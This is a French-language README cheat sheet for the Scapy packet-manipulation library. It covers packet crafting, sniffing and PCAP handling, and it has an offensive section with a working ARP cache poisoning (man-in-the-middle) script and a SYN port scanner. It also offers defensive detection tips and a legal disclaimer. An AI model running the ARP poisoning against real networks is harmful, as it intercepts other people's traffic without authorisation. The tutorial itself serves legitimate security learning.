<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🐍 Scapy - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```
<p align="center">
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="Attaques réseau">
</p>

<p align="center">
  <b>🐍 L'outil et la bibliothèque interactifs ultimes de manipulation de paquets basés sur Python, capables de forger, d'envoyer, de détecter, de disséquer et de fuzzer des paquets réseau arbitraires</b>
</p>

---

## 📋 Table des matières

-[Vue d'ensemble et modèle de couche d'empilage (`/`)](#-overview--the-stacking-layer-model-)
- [Installation](#-installation)
- [Démarrage du Shell interactif](#-starting-the-interactive-shell)
- [Paquets de réseau de création](#-crafting-network-packets)
  - [Poignées de main IP et TCP](#poignées de main ip-et-tcp)
  - [ICMP Ping et Traceroute](#icmp-ping--traceroute)
  - [Requêtes DNS et résolution](#dns-queries--résolution)
- [Envoi et réception de paquets](#-envoi--réception-paquets)
  - [Couche 3 : `send()`, `sr()`, `sr1()`](#layer-3-send-sr-sr1)
  - [Couche 2 : `sendp()`, `srp()`, `srp1()`](#layer-2-sendp-srp-srp1)
-[Renifleur de paquets et gestion PCAP](#-packet-sniffing--pcap-handling)
  - [Capture de paquets en direct (`sniff()`)](#capturing-live-packets-sniff)
  - [Lecture et écriture de fichiers PCAP](#reading--writing-pcap-files)
- [Attaques de réseau offensives](#-attaques-de-réseau-offensives)
  - [ARP Cache Empoisonnement (MITM)](#arp-cache-poisoning-mitm)
  - [Script d'analyse du port SYN] (#syn-port-scanning-script)
  - [TCP SYN / ICMP Flooding](#tcp-syn--icmp-flooding)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et détection](#-considérations-defensives--détection)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et modèle de couche d'empilement (`/`)

Créé par **Philippe Biondi**, **Scapy** remplace des dizaines d'outils réseau à usage unique (ping, traceroute, arpspoof, nmap stubs).

Le génie de Scapy réside dans l'utilisation de l'opérateur de division de Python (`/`) pour empiler les couches de protocole :
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
Chaque champ de couche a des valeurs par défaut saines que Scapy calcule automatiquement (sommes de contrôle, longueurs, adresses MAC, IP source).

---

## 📥Installation
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```
---

## 🚀 Démarrage du Shell interactif

Lancez le shell REPL interactif (nécessite les privilèges root pour forger des sockets bruts) :
```bash
sudo scapy
```
Inspectez les protocoles et les fonctions disponibles dans Scapy :
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```
---

## 🛠️ Création de paquets réseau

### Poignées de main IP et TCP
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```
### ICMP Ping et Traceroute
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```
### Requêtes DNS et résolution
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```
---

## 📡 Envoi et réception de paquets

Scapy sépare la transmission par couche OSI :

### Couche 3 : `send()`, `sr()`, `sr1()`
Fonctionne avec les en-têtes Ethernet attribués par le noyau (commence à la couche IP) :
- `send(pkt)` : transmet le paquet à la couche 3 ; n'attend pas de réponse.
- `sr(pkt)` : envoie des paquets et renvoie des paires répondues et sans réponse `(ans, unans)`.
- `sr1(pkt)` : envoie le paquet et renvoie uniquement le premier paquet de réponse.

### Couche 2 : `sendp()`, `srp()`, `srp1()`
Cadrage Ethernet/liaison de données personnalisé (commence à `Ether()`) :
- `sendp(Ether() / IP(...), iface="eth0")` : Envoie une trame Ethernet brute.
- `srp(Ether() / ARP(...))` : envoyer une demande ARP et recevoir une réponse.

---

## 🔍 Reniflage de paquets et gestion PCAP

### Capture de paquets en direct (`sniff()`)
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```
### Lecture et écriture de fichiers PCAP
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```
---

## ⚔️ Attaques réseau offensives

### Empoisonnement du cache ARP (MITM)
Usurer les tables ARP pour intercepter le trafic entre la victime et la passerelle :
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```
### Script d'analyse du port SYN
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande Scapy |
|-----------|---------------|
| **Démarrer Interactive Shell** | `sudo scapy` |
| **Inspecter les champs du protocole** | `ls(IP)` ou `ls(TCP)` |
| **Envoyer le paquet L3** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **Envoyer et recevoir la 1ère réponse**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **Envoyer une trame Ethernet L2** | `sendp(Ether()/IP(...), iface="eth0")` |
| **Sniff avec filtre BPF** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **Enregistrer dans PCAP** | `wrpcap("out.pcap", pkts)` |
| **Lire du PCAP** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ Considérations défensives et détection

1. **Inspection ARP dynamique (DAI) :** Configurez les commutateurs d'entreprise avec DAI et DHCP Snooping pour supprimer les fausses réponses ARP gratuites.
2. **Règles IDS/Suricata :** Des balayages SYN rapides à moitié ouverts et des combinaisons d'indicateurs TCP mal formées (Xmas, NULL) générées par Scapy déclenchent des alertes IDS standard.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Scapy peut générer des paquets mal formés qui provoquent des conditions de déni de service ou interceptent des données privées. Il doit être strictement utilisé dans les évaluations de sécurité autorisées et les réseaux de tests isolés.